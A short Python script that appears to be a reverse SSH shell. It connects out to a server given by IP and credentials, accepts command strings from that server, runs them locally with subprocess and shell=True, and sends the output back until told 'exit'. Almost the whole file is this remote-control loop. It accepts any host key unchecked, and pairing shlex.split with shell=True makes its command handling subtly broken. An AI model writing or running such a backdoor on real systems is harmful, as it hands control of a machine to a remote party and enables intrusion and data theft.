import paramiko
import shlex
import subprocess
import click

@click.command
@click.option('--ip', prompt='Enter server IP', help='IP address to connect.')
@click.option('--port', '-p', prompt='Enter port', help='SSH port to connect.')
@click.option('--user', '-u', prompt='Enter user', help='Username for the connection.')
@click.password_option()
@click.option('--command', '-cmd', default='ClientConnected', prompt=False, help='Enter commands to be executed. Leave empty while connecting for the first time.')
def main(ip, port, user, password, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=password, look_for_keys=False) # connect to the client

    ssh_session = client.get_transport().open_session() # open new session
    if ssh_session.active: # check if the session is active
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit': # if command is exit close the connection
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output) # check for commands then send cmd output to the client
            except Exception as e:
                b = bytes(str(e), encoding='utf-8')
                ssh_session.send(b)
        client.close()
    return

if __name__ == '__main__':
    main()